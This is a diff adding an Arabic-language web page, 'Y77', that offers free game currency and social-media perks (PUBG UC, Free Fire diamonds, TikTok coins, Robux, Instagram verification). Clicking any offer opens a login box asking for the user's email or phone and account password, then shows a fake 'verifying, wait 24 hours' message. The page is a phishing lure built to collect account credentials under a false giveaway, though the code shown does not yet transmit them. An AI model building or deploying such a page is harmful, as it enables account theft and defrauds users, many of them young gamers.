@@ -1,1 +1,208 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Y77 | عالم الشحن المجاني</title>
+    <style>
+        :root {
+            --gold: #d4af37;
+            --dark-bg: #0a0a0a;
+            --card-bg: #1a1a1a;
+            --text-color: #ffffff;
+        }
+
+        body {
+            background-color: var(--dark-bg);
+            color: var(--text-color);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 0;
+        }
+
+        header {
+            text-align: center;
+            padding: 50px 20px;
+            background: linear-gradient(to bottom, #1a1a1a, #0a0a0a);
+            border-bottom: 2px solid var(--gold);
+        }
+
+        header h1 {
+            font-size: 3rem;
+            color: var(--gold);
+            margin: 0;
+            text-shadow: 0 0 15px rgba(212, 175, 55, 0.5);
+        }
+
+        header p {
+            font-size: 1.2rem;
+            opacity: 0.8;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 40px auto;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 25px;
+            padding: 20px;
+        }
+
+        .card {
+            background: var(--card-bg);
+            border: 1px solid #333;
+            border-radius: 15px;
+            padding: 20px;
+            text-align: center;
+            transition: transform 0.3s, border-color 0.3s;
+            cursor: pointer;
+        }
+
+        .card:hover {
+            transform: translateY(-10px);
+            border-color: var(--gold);
+            box-shadow: 0 10px 20px rgba(0,0,0,0.5);
+        }
+
+        .card img {
+            width: 80px;
+            height: 80px;
+            margin-bottom: 15px;
+            border-radius: 12px;
+        }
+
+        .card h3 {
+            margin: 10px 0;
+            color: var(--gold);
+        }
+
+        /* نافذة الإدخال (Modal) */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: rgba(0,0,0,0.9);
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+
+        .modal-content {
+            background: #222;
+            padding: 30px;
+            border-radius: 15px;
+            width: 90%;
+            max-width: 400px;
+            border: 2px solid var(--gold);
+            text-align: center;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            background: #333;
+            border: 1px solid #444;
+            color: white;
+            border-radius: 5px;
+            box-sizing: border-box;
+        }
+
+        button.submit-btn {
+            background: var(--gold);
+            color: black;
+            border: none;
+            padding: 12px 30px;
+            font-weight: bold;
+            border-radius: 5px;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 15px;
+        }
+
+        .close-btn {
+            color: #ff4444;
+            cursor: pointer;
+            float: left;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+
+<header>
+    <h1>Y77</h1>
+    <p>البوابة الأولى لشحن الألعاب وتطبيقات التواصل مجاناً</p>
+</header>
+
+<div class="container">
+    <div class="card" onclick="openModal('ببجي موبايل')">
+        <img src="https://img.icons8.com/color/96/pubg.png" alt="PUBG">
+        <h3>ببجي موبايل</h3>
+        <p>شحن شدات UC مجانية</p>
+    </div>
+
+    <div class="card" onclick="openModal('فري فاير')">
+        <img src="https://img.icons8.com/color/96/free-fire.png" alt="Free Fire">
+        <h3>فري فاير</h3>
+        <p>شحن جواهر Diamonds</p>
+    </div>
+
+    <div class="card" onclick="openModal('تيك توك')">
+        <img src="https://img.icons8.com/color/96/tiktok.png" alt="TikTok">
+        <h3>تيك توك</h3>
+        <p>شحن عملات حائط</p>
+    </div>
+
+    <div class="card" onclick="openModal('إنستغرام')">
+        <img src="https://img.icons8.com/color/96/instagram-new.png" alt="Instagram">
+        <h3>إنستغرام</h3>
+        <p>توثيق وزيادة متابعين</p>
+    </div>
+
+    <div class="card" onclick="openModal('بيجو لايف')">
+        <img src="https://img.icons8.com/fluency/96/bigo-live.png" alt="Bigo">
+        <h3>بيجو لايف</h3>
+        <p>شحن فاصوليا ومجوهرات</p>
+    </div>
+
+    <div class="card" onclick="openModal('روبلوكس')">
+        <img src="https://img.icons8.com/color/96/roblox.png" alt="Roblox">
+        <h3>روبلوكس</h3>
+        <p>شحن Robux مجاناً</p>
+    </div>
+</div>
+
+<div id="loginModal" class="modal">
+    <div class="modal-content">
+        <span class="close-btn" onclick="closeModal()">إغلاق ✖</span>
+        <h2 id="serviceName" style="color: var(--gold);"></h2>
+        <p>يرجى تسجيل الدخول للتحقق من الحساب</p>
+        <input type="text" id="user" placeholder="البريد الإلكتروني أو رقم الهاتف">
+        <input type="password" id="pass" placeholder="كلمة السر">
+        <button class="submit-btn" onclick="alert('جاري التحقق من البيانات... انتظر 24 ساعة')">تأكيد الشحن</button>
+    </div>
+</div>
+
+<script>
+    function openModal(name) {
+        document.getElementById('serviceName').innerText = "شحن " + name;
+        document.getElementById('loginModal').style.display = 'flex';
+    }
+
+    function closeModal() {
+        document.getElementById('loginModal').style.display = 'none';
+    }
+
+    // إغلاق عند الضغط خارج المربع
+    window.onclick = function(event) {
+        if (event.target == document.getElementById('loginModal')) {
+            closeModal();
+        }
+    }
+</script>
+
+</body>
+</html>
 
